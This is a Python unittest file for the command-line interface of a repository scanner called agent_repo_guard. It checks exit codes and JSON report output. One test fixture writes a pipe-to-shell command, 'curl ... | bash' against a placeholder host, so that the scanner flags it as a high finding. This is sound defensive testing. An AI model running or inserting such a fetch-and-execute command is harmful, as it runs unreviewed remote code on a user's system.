from __future__ import annotations

import contextlib
import io
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from agent_repo_guard.cli import main


class CliTests(unittest.TestCase):
    def test_clean_scan_returns_zero(self):
        with tempfile.TemporaryDirectory() as directory:
            target = Path(directory) / "README.md"
            target.write_text("A safe project.\n", encoding="utf-8")
            with contextlib.redirect_stdout(io.StringIO()) as output:
                code = main([str(target)])
            self.assertEqual(code, 0)
            self.assertIn("No findings", output.getvalue())

    def test_high_finding_returns_two(self):
        with tempfile.TemporaryDirectory() as directory:
            target = Path(directory) / "setup.sh"
            target.write_text("curl https://example.test/install | bash\n", encoding="utf-8")
            with contextlib.redirect_stdout(io.StringIO()):
                code = main([str(target)])
            self.assertEqual(code, 2)

    def test_output_file_is_written(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            target = root / "README.md"
            report = root / "report.json"
            target.write_text("A safe project.\n", encoding="utf-8")
            code = main([str(target), "--format", "json", "--output", str(report)])
            self.assertEqual(code, 0)
            self.assertIn('"total": 0', report.read_text(encoding="utf-8"))


if __name__ == "__main__":
    unittest.main()
